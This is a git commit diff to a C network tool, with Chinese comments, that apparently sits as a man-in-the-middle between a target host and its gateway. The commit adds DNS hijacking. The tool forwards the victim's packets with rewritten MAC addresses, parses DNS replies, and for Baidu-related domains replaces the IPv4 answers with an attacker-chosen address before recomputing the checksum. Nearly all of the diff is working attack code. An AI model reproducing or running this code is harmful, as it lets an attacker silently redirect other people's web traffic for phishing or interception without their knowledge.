4aab3906aa1c56a5a4b85eb71cd31b01c402fea3
chendilin <1399484526@qq.com>
2017-09-02 03:31:38 -0700

    add dns

--- src/function.c
+++ src/function.c
@@ -241,138 +241,92 @@ int three()
     _dns_port = htons(dns);
     
     int send_enable = 1;
-    char *Hdn[100] = {"163", NULL};
+    char *Hdn[100] = {"baidu", "bdimg", "bdstatic", NULL};
     u8 DNS_response_pack[1000]={0};
 	while(1)
 	{
 		int recv_size = recvfrom(sock, recv_buff, 5000, 0, NULL, NULL);
         
         ip_datagram *ip = (ip_datagram *)recv_buff;
-        send_enable = 1;
         
         /* 收到目标主机发送至网关的数据帧 */
         if(ip->iphdr.srcip == dstip)
         {
-	        if(ip->ethhdr.type == _ipv4)
+	        if(ip->ethhdr.type == _ipv4)/* 只转发ip协议数据 */
 	        {
-                if(ip->iphdr.protocol == udp_prot) /* UDP */
+                memcpy(ip->ethhdr.dst,gatewaymac,6);/* 修改数据包中源mac地址为本机mac，目标mac为网关mac */
+                memcpy(ip->ethhdr.src,localmac,6);
+                if(recv_size != sendto(sock, recv_buff, recv_size, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
                 {
-                    udp_datagram *udp = (udp_datagram *)recv_buff;
-                    if(udp->udphdr.dstport == _dns_port) /* DNS服务 */
-                    {
-                    	/* Resolve the target access domain name */
-                        char domain[100] = {0};
-                        char *pdomain = domain;
-                        dns_datagram *dnsframe = (dns_datagram *)recv_buff;
-                        int length_1 = (int)dnsframe->domain[0];
-                        char *p = dnsframe->domain;
-                        p = p + 1 + length_1;
-                        int length_2 = (int)*p;
-                        p++;
-                        while(length_2)
-                        {
-                            *pdomain = *p;
-                            p++;
-                            pdomain++;
-                            length_2--;
-                        }
-                        printf("%s\n",domain);
-                        int i = 0;
-                        while(Hdn[i] != NULL)
-                        {
-                        	if(!strcmp(domain, Hdn[i]))
-                        	{
-                        		send_enable = 0;
-                        		//srcmac dstmac
-                        		//srcip dstip checksum length = length + 16
-                        		//srcport dstport checksum length = length + 16 
-                        		//dns flags answer authority additional 
-                        		//DNS response
-
-                        		//Construct DNS response packs
-
-                        		memcpy(DNS_response_pack, recv_buff, recv_size);
-                        		dns_datagram *response_dns = (dns_datagram *)DNS_response_pack;
-                        		//srcmac dstmac
-                        		memcpy(response_dns->ethhdr.dst, dstmac, 6);
-                        		memcpy(response_dns->ethhdr.src, localmac, 6);
-                        		//srcip dstip checksum length = length + 16
-                        		response_dns->iphdr.srcip = dnsframe->iphdr.dstip;
-                        		response_dns->iphdr.dstip = dnsframe->iphdr.srcip;
-                        		response_dns->iphdr.total_length = htons(ntohs(response_dns->iphdr.total_length) + 16);
-
-                        		response_dns->iphdr.check_sum = 0;
-                        		u16 ip_check_sum = check_sum((u16 *)&dnsframe->iphdr.length_ver, sizeof(ip_header));
-                        		response_dns->iphdr.check_sum = htons(ip_check_sum);
-
-                        		//srcport dstport checksum length = length + 16
-                        		response_dns->udphdr.srcport = dnsframe->udphdr.dstport;
-                        		response_dns->udphdr.dstport = dnsframe->udphdr.srcport;
-                        		response_dns->udphdr.total_length = htons(ntohs(response_dns->udphdr.total_length) + 16);
-                        		response_dns->flags = htons(0x8180);
-                        		response_dns->answer_rrs = htons(1);//1 answer
-                        		//dns answer info
-                        		udp_whdr whdr;
-                        		dns_answer answer;
-                        		answer.name = htons(0xc00c);
-                        		answer.type = htons(0x0001);
-                        		answer.class = htons(0x0001);
-                        		answer.ttl = htonl(16);
-                        		answer.datalength = htons(0x0004);
-                        		answer.ipaddr = inet_addr("192.168.1.113");
-                        		u8 sd[16] = {0x5a};
-                        		memset(sd,0x5a,16);
-                        		//wei header
-                        		whdr.srcip = response_dns->iphdr.srcip;
-                        		whdr.dstip = response_dns->iphdr.dstip;
-                        		whdr.zero = 0;
-                        		whdr.protocol = 0x11; /* udp */
-                        		whdr.length = recv_size - sizeof(ip_datagram) + 16; /* udphdr and udpdata length */
-                        		int check_sum_length = whdr.length + 12;
-                        		//udp header
-                        		int domainsize = recv_size - sizeof(udp_datagram) - 12;
-                        		memcpy(whdr.udphdr, &response_dns->udphdr.srcport, 8);
-                        		memcpy(whdr.udpdata, &response_dns->transactionid, domainsize);
-                        		memcpy(whdr.udpdata+domainsize, &answer, 16);
-                        		//cacl check_sum
-                        		response_dns->udphdr.check_sum = 0;
-                        		u16 udp_check_sum = check_sum((u16 *)&whdr, check_sum_length);
-                        		response_dns->udphdr.check_sum = htons(udp_check_sum);
-                        		//add answer
-                        		// printf("name=%x\n",answer.name);
-                        		// printf("type=%x\n",answer.type);
-                        		// printf("class=%x\n",answer.class);
-                        		// printf("ttl=%x\n",answer.ttl);
-                        		// printf("datalength=%x\n",answer.datalength);
-                        		// printf("ipaddr=%x\n",answer.ipaddr);
-                        		printf("domainsize=%d\n",domainsize);
-                        		memcpy(response_dns->domain+domainsize, &answer, 16);
-                        		int response_totalsize = recv_size + 16;
-                        		if(response_totalsize != sendto(sock, DNS_response_pack, response_totalsize, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
-			                    {
-			                        perror("send error");
-			                    } 
-                        		break;
-                        	}
-                        	i++;
-                        }
-                    }
-                }
-	            if(1 == send_enable)
-                {
-                    memcpy(ip->ethhdr.dst,gatewaymac,6);/* 修改数据包中元mac地址为本机mac，目标mac为网关mac */
-                    memcpy(ip->ethhdr.src,localmac,6);
-                    if(recv_size != sendto(sock, recv_buff, recv_size, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
-                    {
-                        perror("send error");
-                    } 
-                }
+                    perror("send error");
+                } 
 	        }
         }
         
         /* 收到网关发送至目标主机的数据帧 */
         if(ip->iphdr.dstip == dstip)
         {
+            if(ip->ethhdr.type == _ipv4)
+	        {
+                if(ip->iphdr.protocol == udp_prot) /* UDP */
+                {
+                    udp_datagram *udp = (udp_datagram *)recv_buff;
+                    if(udp->udphdr.srcport == _dns_port) /* DNS服务 */
+                    {
+                    	/* 解析主机访问的域名 */
+                        char domain[100] = {0};
+                        dns_datagram *dnsframe = (dns_datagram *)recv_buff;
+                        int length_1 = (int)dnsframe->domain[0];
+                        char *p = dnsframe->domain;
+                        p = p + 1 + length_1;
+                        int length_2 = (int)*p;
+                        p++;
+                        memcpy(domain, p, length_2);
+                        printf("%s\n",domain);
+                        
+                        /* 计算问题数用总字节数 */
+                        p = dnsframe->domain;
+                        int question_length = 0;
+                        while(*p != 0)
+                        {
+                            question_length += 1;
+                            p++;
+                        }
+                        question_length -= 1;/* 域名长度 */
+                        question_length += 4;/* 查询类型 查询类 4byte */
+                        
+                        //printf("totallength=%d\n", question_length);
+                        
+                        int answernum = ntohs(dnsframe->answer_rrs);
+                        
+                        int i = 0;
+                        while(Hdn[i] != NULL)
+                        {
+                        	if(0 == strcmp(domain, Hdn[i])) /* 如果目标访问的是被劫持域名，则修改数据包并返回给主机一个假的ip地址 */
+                        	{
+                                //change ipaddr
+                                printf("**********hijack\n");
+                                dns_answer *answer = (dns_answer *)(dnsframe->domain+question_length);
+                        		while(answernum)
+                                {
+                                    answernum--;
+                                    if(answer->type == htons(0x0001))/* 若响应类型是IPV4地址，则更改 */
+                                    {
+                                        answer->ipaddr = inet_addr("192.168.3.113");
+                                    }
+                                    answer++;
+                                }
+                                //change udp_check_sum
+                                dnsframe->udphdr.check_sum = 0;
+                                dnsframe->udphdr.check_sum = htons(check_sum((u16 *)&dnsframe->udphdr, \
+                                recv_size-sizeof(ip_datagram)));
+                                break;
+                        	}
+                        	i++;
+                        }
+                    }
+                }
+	        }   
             memcpy(ip->ethhdr.dst,dstmac,6);
             memcpy(ip->ethhdr.src,localmac,6);
             if(recv_size != sendto(sock, recv_buff, recv_size, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
